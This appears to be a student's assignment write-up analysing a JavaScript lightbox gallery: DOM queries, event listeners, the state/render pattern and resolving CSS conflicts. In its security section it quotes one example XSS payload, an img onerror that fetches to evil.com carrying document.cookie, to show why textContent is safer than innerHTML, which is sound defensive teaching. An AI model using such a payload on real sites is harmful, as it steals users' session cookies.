1. The DOM
    The lines at the top of the code that locate DOM elements are lines 8-11. Each of them return a single element. The closest thing to a collection may be my images in state.images from lines 17-22. It looks like lb.querSelector(...) is used over document.querySelector(...) for a few reasons: Scope/correctness -- searching only inside lb and not for stray .lightbox__img's elsewhere, Intent: clearly communicating which items belong to the subtree, and Performance: resulting in a smaller overall subtree to walk. 

2. Event Listeners
    Line 45 — attached to each thumb img inside the build loop, event 'click', handler opens the lightbox at that thumb's index.

    Line 74 — attached to lb (the overlay), event 'click', handler closes the lightbox only if the click target is the backdrop itself (not the image or caption inside).
    
    Line 78 — attached to document, event 'keydown', handler closes the lightbox if the key is Escape and the lightbox is open. 

    No event delegation is used in the strictest sense. However, line 74 does use target discrimination. This is not delegation because the listener isn't routing to different handlers for different children. 

3. State and Render Pattern
    The state object is from lines 14-23. It consists of isOpen, index and images -- which is an array of src, caption. When a thumbnail is clicked, the listener at lines 45 firest with the index i, the handler calls openLightbox(i) in lines 49-53, at line 50 state.isOpen = true and then state.index = i at line 51, then render() is called in line 52. From lines 67-71 render() reads state.images[state.index] at line 63, calls lbImg.setAttribute('src', src) at line 64, lbCap.textContent = caption at line 66, and adds the open class to lb at line 67. The CSS rule .lightbox.open { display: flex; opacity: 1; } in style.css is what makes it visible. Mutators openLightbox, at lines 49-53, and closeLightbox, at 55-58, both share the pattern mutate state and then call render(). Rnder() is defined on lines 67-71 and called from lines 52-57. Ultimately the state would change in memor but the DOM would still reflect the old state if you upaded state and forgot to call render(). A thumbnail would be clicked ad state.isOpen becomes true. However, .lightbox would never get the open class, so dispay: none and the overlay wouldn't appear. 

4. Security
     Lines 64-66 demonstrate XSS-safe DOM updates. textContent treats the value as a literal string -- which prevents symbols from being interpreted as markup. innerHTML does the opposite and parses the string as HTML. As an example, If line 66 were lbCap.innerHTML = caption, a caption like <img src=x onerror="fetch('//evil.com?c='+document.cookie)"> would cause the browser to create an <img>, fire its onerror handler, and run the attacker's JavaScript in your page's origin — stealing cookies, session tokens, or anything else accessible from the DOM. That's the stored/reflected XSS attack class, depending on how the caption got there.

5. Patterns
    state + render: 
        state object at 14-23, render() at 61-71, mutators both call render() at 61-71 and 55-58. 
    
    event listener: 
        there are three of them at lines 45, 74, and 78
    
    Module scope:
        gallery, lb, lbImg, lbCap, state, openLightbox, closeLightbox, render all live at file/script scope (lines 8–11, 14, 49, 55, 61) — they're shared by every function in the file without being attached to window or passed as arguments.
    


Where did you put the lightbox trigger(s), and why does that placement make sense for your page?

    The triggers live live right on the thumbnails themselves. This is the primary content of the page -- where the eye of ther user is drawn. This also aligns with previous expectations about being able to interact with images themselves -- on platforms like instagram or facebook -- and does not require any extra UI. 

What content did you choose, and what does it represent?

    The content I chose aligns with various hobbies and interests within myself. The style of the page and images also align with my preference for dark mode and I think they fit the overall sci-fi / cyberpunk aesthetic of the images themselves. 

How did you reconcile class names — did you change yours to match the starter's, change the starter's to match yours, or use both as-is?

    I kept the starter's as-is. This could actually be beneficial in case I wanted to make any adjustments to js/lightbox.js without rename churn. 

What CSS conflicts did you have to resolve, and how?

    Two real conflicts existed between my style.css and the starter's css/lightbox.css:
        1. Both files define .gallery. Mine uses a 2-column grid (style.css lines 59-63); the starter uses an auto-fill grid with different gap and extra padding/margin (css/lightbox.css lines 7-14).
        2. Both try to style the thumbnails. The starter's .gallery__thumb (css/lightbox.css lines 16-24) sizes the image to a 1:1 square and draws a 1px #ddd border that looks bad on my #121212 dark theme. Its layout rules also compete with my .photo img (style.css lines 78-83).

    My resolution strategy ended up being CSS load order plus one targeted edit, not refusing to link the starter's file at all. In index.html I link css/lightbox.css first and style.css second (lines 7-8):
        <link rel="stylesheet" href="css/lightbox.css">
        <link rel="stylesheet" href="style.css">
    Where both files define the same selector with the same specificity, my style.css wins because it loads later. That keeps the 2-column .gallery layout, the .photo img sizing, and my darker .lightbox overlay values — backdrop rgba(0, 0, 0, 0.9) instead of the starter's 0.85, caption color #e8e8e8 instead of pure white.

    The .gallery__thumb border wasn't something load order could fix, because my style.css doesn't define a competing border on .gallery__thumb, so nothing overrides the starter's rule. I commented that one line out directly in css/lightbox.css rather than adding an override in style.css, since it was purely cosmetic for this theme. The starter's .gallery__thumb hover transition (transform: scale(1.03) + box-shadow) does now apply alongside my .photo:hover lift, which actually improves the click feedback on the cards.